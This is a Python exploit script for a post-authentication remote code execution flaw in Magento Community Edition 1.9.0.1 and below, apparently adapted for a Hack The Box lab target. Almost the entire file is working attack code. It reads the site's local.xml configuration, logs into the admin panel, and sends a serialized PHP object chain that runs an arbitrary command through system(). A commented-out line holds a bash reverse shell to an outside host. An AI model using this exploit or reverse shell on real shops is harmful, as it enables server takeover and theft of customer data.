#!/usr/bin/python
"""
Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
Google Dork: "Powered by Magento"
Date: 08/18/2015
Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
Vendor Homepage: http://magento.com/
Software Link: https://www.magentocommerce.com/download
Version: 1.9.0.1 and below
Tested on: Ubuntu 15
CVE : none

TL additions:
Ported to Python 3
Added auto install date fetching
tidied up code for PEP8
Removed mechanize requirement
"""
import re
import sys
import base64
from hashlib import md5
import xml.etree.ElementTree as ET

import requests


# Start a session
session = requests.session()

# Hard coded args
target = "http://swagshop.htb"
command = "id"
# command = "bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'"
username = "username"
password = "password"

print(f"[+] target: {target}")
print(f"[+] command: {command}")
print(f"[+] username: {username}")
print(f"[+] password: {password}")

# Start by determining the install date
# This is in the /app/etc/local.xml file
print("\n[+] Determine install date...")
localxml_url = f"{target}/app/etc/local.xml"
print(f"[+] localxml_url: {localxml_url}")

# Get the local.xml file
r = session.get(localxml_url)

# Parse local.xml file, looking for install date
localxml_str = r.text
tree = ET.fromstring(localxml_str)
try:
    install_date = tree.findall("global")[0].findall("install")[0].findall("date")[0].text
    print(f"[+] install_date: {install_date}")
except IndexError:
    print("[-] Error: Cannot auto extract install date...")
    print("[+] Exiting.")
    exit(1)

# Try log in to the admin panel
login_url = f"{target}/index.php/admin"
login_data = {
    "form_key": "L3QPQ1rQPqYiYYwP",
    "login[username]": username,
    "dummy": "",
    "login[password]": password,
}

print("\n[+] Log in to admin panel...")
r = session.post(login_url, data=login_data)

# Get the content of the page and extract ajax URL and key
content = r.text
url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

print(f"[+] url: {url}")
print(f"[+] key: {key}")

# Use the ajax url create a request to get the form key
fetch_url = f"{url}block/tab_orders/period/7d/"
fetch_params = {
    "isAjax": False,
    "form_key": key
}

print(f"[+] fetch_url: {fetch_url}")
print(f"[+] fetch_params: {fetch_params}")

r = session.get(fetch_url, params=fetch_params)
content = r.text
exploit_url = re.search("src=\"(.*)\?ga=", content)
exploit_url = exploit_url.group(1)

print("\n[+] Run exploit...")
print(f"[+] exploit_url: {exploit_url}")

# Start forming payload
# PHP function to run, can only pass 1 argument to the function
php_function = "system"
# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
'\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
'_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function, len(command), command)

# Convert to bytes
payload_bytes = payload.encode("utf-8")
# Convert to base64
payload_b64 = base64.b64encode(payload_bytes)
# Convert to str
payload_b64 = payload_b64.decode("utf-8")
# Concatenate base64 payload and install date
to_hash = payload_b64 + install_date
# Convert to bytes
to_hash_bytes = to_hash.encode("utf-8")
h = md5(to_hash_bytes).hexdigest()

print(f"[+] h: {h}")

exploit_data = {
    "ga": payload_b64,
    "h": h,
}

r = session.get(exploit_url, params=exploit_data)

print(f"[+] r.status_code: {r.status_code}")
print(f"[+] r.text: {r.text}")
